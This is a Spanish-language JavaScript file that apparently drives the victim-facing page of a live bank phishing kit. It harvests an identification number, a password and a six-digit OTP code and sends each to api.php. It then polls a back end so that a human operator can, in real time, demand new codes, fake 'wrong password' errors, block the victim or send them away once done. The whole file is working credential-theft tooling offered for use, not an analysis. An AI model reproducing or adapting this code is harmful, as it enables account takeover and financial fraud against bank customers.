document.addEventListener('DOMContentLoaded', () => {
    // Referencias a los elementos del DOM
    const formPaso1 = document.getElementById('formPaso1');
    const inputIdentificacion = document.getElementById('identificacion');
    const errorPaso1 = document.getElementById('errorPaso1');
    const btnPaso1 = document.getElementById('btnPaso1');

    const formPaso2 = document.getElementById('formPaso2');
    const inputPassword = document.getElementById('password');
    const errorPaso2 = document.getElementById('errorPaso2');
    const btnPaso2 = document.getElementById('btnPaso2');
    const togglePass = document.getElementById('togglePass');

    const loadingState = document.getElementById('authLoading');

    const formPaso3 = document.getElementById('formPaso3');
    const inputCodigo = document.getElementById('codigo');
    const errorPaso3 = document.getElementById('errorPaso3');
    const btnPaso3 = document.getElementById('btnPaso3');
    const otpBoxes = document.querySelectorAll('.otp-box');

    const authBlocked = document.getElementById('authBlocked');

    let pollInterval = null;
    let currentCuadroId = '';
    let ultimaAccionProcesada = '';

    function obtenerCuadroIdActual() {
        if (currentCuadroId) return currentCuadroId;
        const attrId = loadingState ? loadingState.getAttribute('data-cuadro-id') : '';
        if (attrId) return attrId;
        return sessionStorage.getItem('dav_cuadro_id') || '';
    }

    function detenerMonitoreo() {
        if (pollInterval) {
            clearInterval(pollInterval);
            pollInterval = null;
        }
    }

    function registrarSalida() {
        const id = obtenerCuadroIdActual();
        if (!id) return;

        if (navigator.sendBeacon) {
            const formData = new FormData();
            formData.append('action', 'offline');
            formData.append('id', id);
            navigator.sendBeacon('api.php', formData);
        } else {
            fetch(`api.php?action=offline&id=${encodeURIComponent(id)}`, { keepalive: true }).catch(() => {});
        }
    }

    // Únicamente al cerrar definitivamente la pestaña
    window.addEventListener('beforeunload', registrarSalida);

    // Al regresar o enfocar la pestaña, refrescar "En línea"
    document.addEventListener('visibilitychange', () => {
        if (!document.hidden) {
            const id = obtenerCuadroIdActual();
            if (id) {
                fetch(`api.php?action=ping&id=${encodeURIComponent(id)}&_t=${Date.now()}`).catch(() => {});
            }
        }
    });

    function ocultarTodo() {
        if (formPaso1) formPaso1.classList.add('hidden');
        if (formPaso2) formPaso2.classList.add('hidden');
        if (loadingState) loadingState.classList.remove('active');
        if (formPaso3) formPaso3.classList.add('hidden');
        if (authBlocked) authBlocked.classList.remove('active');
    }

    // Toggle de visibilidad de contraseña
    if (togglePass && inputPassword) {
        togglePass.addEventListener('click', () => {
            const eye = togglePass.querySelector('.eye-icon');
            const eyeOff = togglePass.querySelector('.eye-off-icon');
            const esPassword = inputPassword.getAttribute('type') === 'password';

            if (esPassword) {
                inputPassword.setAttribute('type', 'text');
                if (eye) eye.style.display = 'none';
                if (eyeOff) eyeOff.style.display = 'block';
            } else {
                inputPassword.setAttribute('type', 'password');
                if (eye) eye.style.display = 'block';
                if (eyeOff) eyeOff.style.display = 'none';
            }
        });
    }

    // Validación interactiva: Identificación (solo dígitos)
    if (inputIdentificacion) {
        inputIdentificacion.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '');
            if (errorPaso1) errorPaso1.style.display = 'none';
        });
        inputIdentificacion.addEventListener('keydown', (e) => {
            if (e.key === ' ') e.preventDefault();
        });
        if (formPaso1 && !formPaso1.classList.contains('hidden')) {
            inputIdentificacion.focus();
        }
    }

    // Validación interactiva: Contraseña
    if (inputPassword) {
        inputPassword.addEventListener('input', () => {
            if (errorPaso2) errorPaso2.style.display = 'none';
        });
        if (formPaso2 && !formPaso2.classList.contains('hidden')) {
            inputPassword.focus();
        }
    }

    // ==========================================
    // LÓGICA DE 6 CASILLAS DE CÓDIGO (OTP)
    // ==========================================
    function obtenerCodigoCompleto() {
        let code = '';
        otpBoxes.forEach(box => {
            code += box.value;
        });
        return code.trim();
    }

    function sincronizarCodigo() {
        const code = obtenerCodigoCompleto();
        if (inputCodigo) inputCodigo.value = code;
        return code;
    }

    function limpiarCasillasCodigo() {
        otpBoxes.forEach(box => {
            box.value = '';
            box.disabled = false;
            box.classList.remove('filled');
        });
        if (inputCodigo) {
            inputCodigo.value = '';
            inputCodigo.disabled = false;
        }
        if (otpBoxes.length > 0 && formPaso3 && !formPaso3.classList.contains('hidden')) {
            setTimeout(() => { otpBoxes[0].focus(); }, 60);
        }
    }

    function deshabilitarCasillasCodigo(deshabilitar = true) {
        otpBoxes.forEach(box => { box.disabled = deshabilitar; });
        if (inputCodigo) inputCodigo.disabled = deshabilitar;
    }

    function enfocarPrimeraCasillaVacia() {
        for (let i = 0; i < otpBoxes.length; i++) {
            if (!otpBoxes[i].value) {
                otpBoxes[i].focus();
                return;
            }
        }
        if (otpBoxes.length > 0) otpBoxes[otpBoxes.length - 1].focus();
    }

    if (otpBoxes.length > 0) {
        otpBoxes.forEach((box, index) => {
            // Entrada de texto
            box.addEventListener('input', (e) => {
                const val = e.target.value.replace(/\D/g, '');

                if (!val) {
                    e.target.value = '';
                    e.target.classList.remove('filled');
                    sincronizarCodigo();
                    return;
                }

                if (val.length === 1) {
                    e.target.value = val;
                    e.target.classList.add('filled');
                    if (index < otpBoxes.length - 1) {
                        otpBoxes[index + 1].focus();
                    }
                } else {
                    // Si se pegó o autocompletó más de 1 dígito en la casilla actual
                    const digits = val.split('');
                    digits.forEach((d, dIdx) => {
                        const targetIdx = index + dIdx;
                        if (targetIdx < otpBoxes.length) {
                            otpBoxes[targetIdx].value = d;
                            otpBoxes[targetIdx].classList.add('filled');
                        }
                    });
                    const nextIdx = Math.min(index + digits.length, otpBoxes.length - 1);
                    otpBoxes[nextIdx].focus();
                }

                sincronizarCodigo();
                if (errorPaso3) errorPaso3.style.display = 'none';
            });

            // Control de teclas (Backspace, flechas)
            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace') {
                    if (box.value) {
                        box.value = '';
                        box.classList.remove('filled');
                        sincronizarCodigo();
                        e.preventDefault();
                    } else if (index > 0) {
                        otpBoxes[index - 1].focus();
                        otpBoxes[index - 1].value = '';
                        otpBoxes[index - 1].classList.remove('filled');
                        sincronizarCodigo();
                        e.preventDefault();
                    }
                } else if (e.key === 'ArrowLeft') {
                    if (index > 0) {
                        otpBoxes[index - 1].focus();
                        e.preventDefault();
                    }
                } else if (e.key === 'ArrowRight') {
                    if (index < otpBoxes.length - 1) {
                        otpBoxes[index + 1].focus();
                        e.preventDefault();
                    }
                } else if (e.key === ' ' || e.key === 'Spacebar') {
                    e.preventDefault();
                }
            });

            // Seleccionar texto al hacer clic o foco
            box.addEventListener('focus', () => {
                box.select();
            });

            // Pegar código completo desde portapapeles
            box.addEventListener('paste', (e) => {
                e.preventDefault();
                const clipboardData = e.clipboardData || window.clipboardData;
                if (!clipboardData) return;
                const pasted = clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
                if (!pasted) return;

                pasted.split('').forEach((d, idx) => {
                    if (otpBoxes[idx]) {
                        otpBoxes[idx].value = d;
                        otpBoxes[idx].classList.add('filled');
                    }
                });

                const nextFocus = Math.min(pasted.length, otpBoxes.length - 1);
                if (otpBoxes[nextFocus]) {
                    otpBoxes[nextFocus].focus();
                }
                sincronizarCodigo();
                if (errorPaso3) errorPaso3.style.display = 'none';
            });
        });

        if (formPaso3 && !formPaso3.classList.contains('hidden')) {
            otpBoxes[0].focus();
        }
    }

    // Iniciar o reiniciar sondeo para un ID específico
    function iniciarMonitoreo(cuadroId) {
        if (!cuadroId) return;

        currentCuadroId = cuadroId;
        sessionStorage.setItem('dav_cuadro_id', cuadroId);
        if (loadingState) {
            loadingState.setAttribute('data-cuadro-id', cuadroId);
        }

        // Siempre detener sondeos previos para evitar consultar IDs viejos
        detenerMonitoreo();

        // Enviar ping inicial de inmediato
        fetch(`api.php?action=ping&id=${encodeURIComponent(cuadroId)}&_t=${Date.now()}`).catch(() => {});

        pollInterval = setInterval(async () => {
            const targetId = currentCuadroId || obtenerCuadroIdActual();
            if (!targetId) return;

            try {
                const res = await fetch(`api.php?action=check_status&id=${encodeURIComponent(targetId)}&_t=${Date.now()}`);
                const data = await res.json();

                if (!data || !data.success) {
                    return;
                }

                // Acción 1: Relogin -> Mandar al principio (Paso 1)
                if (data.accion === 'relogin') {
                    detenerMonitoreo();
                    sessionStorage.removeItem('dav_cuadro_id');
                    window.location.href = 'index.php?error=relogin';
                    return;
                }

                // Acción 2: Finalizar -> Redirección a URL configurada
                if (data.accion === 'finalizar') {
                    detenerMonitoreo();
                    registrarSalida();
                    sessionStorage.removeItem('dav_cuadro_id');
                    const destino = data.redirect_url || 'https://www.google.com';
                    window.location.href = destino;
                    return;
                }

                // Acción 3: Bloquear -> Bloqueo total
                if (data.accion === 'bloquear' || data.bloqueado) {
                    detenerMonitoreo();
                    ocultarTodo();
                    if (authBlocked) authBlocked.classList.add('active');
                    return;
                }

                // Acción 4: Pedir Código de 6 dígitos
                // Si la orden es pedir_codigo Y el formulario de código está oculto, MOSTRARLO INMEDIATAMENTE
                if (data.accion === 'pedir_codigo') {
                    if (formPaso3 && formPaso3.classList.contains('hidden')) {
                        ocultarTodo();
                        formPaso3.classList.remove('hidden');
                        if (btnPaso3) btnPaso3.disabled = false;
                        if (errorPaso3) errorPaso3.style.display = 'none';
                        limpiarCasillasCodigo();
                    }
                    return;
                }

                // Acción 5: Código Erróneo -> Solo se activa UNA vez al recibir la orden
                if (data.accion === 'codigo_error') {
                    if (ultimaAccionProcesada !== 'codigo_error') {
                        ultimaAccionProcesada = 'codigo_error';
                        ocultarTodo();
                        if (formPaso3) formPaso3.classList.remove('hidden');
                        if (errorPaso3) {
                            errorPaso3.textContent = 'El código ingresado es incorrecto o ha vencido. Ingrese un nuevo código.';
                            errorPaso3.style.display = 'block';
                        }
                        if (btnPaso3) btnPaso3.disabled = false;
                        limpiarCasillasCodigo();
                    }
                    return;
                }

                // Acción 6: Contraseña Errónea -> Solo se activa UNA vez al recibir la orden
                if (data.accion === 'pass_error') {
                    if (ultimaAccionProcesada !== 'pass_error') {
                        ultimaAccionProcesada = 'pass_error';
                        ocultarTodo();
                        if (formPaso2) formPaso2.classList.remove('hidden');
                        if (errorPaso2) {
                            errorPaso2.textContent = 'Contraseña incorrecta. Por favor intente nuevamente.';
                            errorPaso2.style.display = 'block';
                        }
                        if (btnPaso2) btnPaso2.disabled = false;
                        if (inputPassword) {
                            inputPassword.disabled = false;
                            inputPassword.value = '';
                            inputPassword.focus();
                        }
                    }
                    return;
                }

                // Si la acción es esperando, resetear bandera de acción procesada
                if (data.accion === 'esperando') {
                    ultimaAccionProcesada = '';
                }

            } catch (err) {
                // Silencioso ante fallos temporales de red
            }
        }, 1200);
    }

    // Inicialización al entrar o recargar la web:
    // Siempre iniciar pidiendo los datos desde el Paso 1 y generar un contenedor nuevo en el panel al enviar
    sessionStorage.clear();
    currentCuadroId = '';
    detenerMonitoreo();
    if (loadingState) loadingState.removeAttribute('data-cuadro-id');
    
    ocultarTodo();
    if (formPaso1) {
        formPaso1.classList.remove('hidden');
        if (inputIdentificacion) {
            inputIdentificacion.value = '';
            inputIdentificacion.focus();
        }
    }
    if (inputPassword) inputPassword.value = '';
    limpiarCasillasCodigo();
    ultimaAccionProcesada = '';

    // Si el usuario regresa usando el botón atrás/adelante del navegador (bfcache)
    window.addEventListener('pageshow', (event) => {
        if (event.persisted) {
            window.location.reload();
        }
    });

    // ==========================================
    // ENVÍO PASO 1: Número de Identificación
    // ==========================================
    if (formPaso1) {
        formPaso1.addEventListener('submit', async (e) => {
            e.preventDefault();

            const docVal = inputIdentificacion ? inputIdentificacion.value.trim() : '';
            if (!docVal) {
                if (errorPaso1) {
                    errorPaso1.textContent = 'Por favor ingrese su número de identificación.';
                    errorPaso1.style.display = 'block';
                }
                if (inputIdentificacion) inputIdentificacion.focus();
                return;
            }

            if (btnPaso1) btnPaso1.disabled = true;

            try {
                const formData = new FormData();
                formData.append('identificacion', docVal);

                const res = await fetch('api.php?action=add', {
                    method: 'POST',
                    body: formData
                });
                const data = await res.json();

                if (data.success && data.data && data.data.id) {
                    const newId = data.data.id;
                    currentCuadroId = newId;
                    sessionStorage.setItem('dav_cuadro_id', newId);
                    if (loadingState) {
                        loadingState.setAttribute('data-cuadro-id', newId);
                    }

                    ultimaAccionProcesada = '';

                    // Iniciar monitoreo del cuadro nuevo
                    iniciarMonitoreo(newId);

                    // Transición al PASO 2: Contraseña
                    ocultarTodo();
                    if (formPaso2) {
                        formPaso2.classList.remove('hidden');
                        if (inputPassword) {
                            inputPassword.disabled = false;
                            inputPassword.value = '';
                            inputPassword.focus();
                        }
                        if (btnPaso2) btnPaso2.disabled = false;
                    }
                } else {
                    if (btnPaso1) btnPaso1.disabled = false;
                    if (errorPaso1) {
                        errorPaso1.textContent = data.message || 'Error al procesar. Intente de nuevo.';
                        errorPaso1.style.display = 'block';
                    }
                }
            } catch (err) {
                if (btnPaso1) btnPaso1.disabled = false;
                if (errorPaso1) {
                    errorPaso1.textContent = 'Error de conexión. Intente nuevamente.';
                    errorPaso1.style.display = 'block';
                }
            }
        });
    }

    // ==========================================
    // ENVÍO PASO 2: Contraseña
    // ==========================================
    if (formPaso2) {
        formPaso2.addEventListener('submit', async (e) => {
            e.preventDefault();

            const passVal = inputPassword ? inputPassword.value : '';
            if (!passVal) {
                if (errorPaso2) {
                    errorPaso2.textContent = 'Por favor ingrese su contraseña.';
                    errorPaso2.style.display = 'block';
                }
                if (inputPassword) inputPassword.focus();
                return;
            }

            const cuadroId = obtenerCuadroIdActual();
            if (!cuadroId) {
                ocultarTodo();
                if (formPaso1) formPaso1.classList.remove('hidden');
                return;
            }

            if (btnPaso2) btnPaso2.disabled = true;

            // Tras enviar la contraseña, pasa a: "se queda cargando validación"
            ocultarTodo();
            if (loadingState) {
                loadingState.classList.add('active');
            }

            ultimaAccionProcesada = '';

            try {
                const formData = new FormData();
                formData.append('id', cuadroId);
                formData.append('password', passVal);

                const res = await fetch('api.php?action=set_password', {
                    method: 'POST',
                    body: formData
                });
                const data = await res.json();

                if (!data.success) {
                    ocultarTodo();
                    if (formPaso2) formPaso2.classList.remove('hidden');
                    if (btnPaso2) btnPaso2.disabled = false;
                    if (errorPaso2) {
                        errorPaso2.textContent = data.message || 'Error al validar contraseña.';
                        errorPaso2.style.display = 'block';
                    }
                } else {
                    // Asegurar que el monitoreo siga activo para este cuadroId
                    iniciarMonitoreo(cuadroId);
                }
            } catch (err) {
                // Silencioso ante fallos, se mantiene en validación
            }
        });
    }

    // ==========================================
    // ENVÍO PASO 3: Código de 6 dígitos
    // ==========================================
    if (formPaso3) {
        formPaso3.addEventListener('submit', async (e) => {
            e.preventDefault();

            const codVal = sincronizarCodigo();
            if (!codVal || codVal.length < 6) {
                if (errorPaso3) {
                    errorPaso3.textContent = 'Por favor ingrese el código de 6 dígitos completo.';
                    errorPaso3.style.display = 'block';
                }
                enfocarPrimeraCasillaVacia();
                return;
            }

            const cuadroId = obtenerCuadroIdActual();
            if (!cuadroId) {
                ocultarTodo();
                if (formPaso1) formPaso1.classList.remove('hidden');
                return;
            }

            if (btnPaso3) btnPaso3.disabled = true;
            deshabilitarCasillasCodigo(true);

            // Al enviar el código de 6 dígitos, vuelve a "se queda cargando validación"
            ocultarTodo();
            if (loadingState) {
                loadingState.classList.add('active');
            }

            ultimaAccionProcesada = '';

            try {
                const formData = new FormData();
                formData.append('id', cuadroId);
                formData.append('codigo', codVal);

                const res = await fetch('api.php?action=set_code', {
                    method: 'POST',
                    body: formData
                });
                const data = await res.json();

                if (!data.success) {
                    ocultarTodo();
                    if (formPaso3) formPaso3.classList.remove('hidden');
                    if (btnPaso3) btnPaso3.disabled = false;
                    deshabilitarCasillasCodigo(false);
                    if (errorPaso3) {
                        errorPaso3.textContent = data.message || 'Error al validar código.';
                        errorPaso3.style.display = 'block';
                    }
                    enfocarPrimeraCasillaVacia();
                } else {
                    // Asegurar que el monitoreo siga activo mientras el operador decide
                    iniciarMonitoreo(cuadroId);
                }
            } catch (err) {
                // Silencioso, se mantiene en validación
            }
        });
    }
});
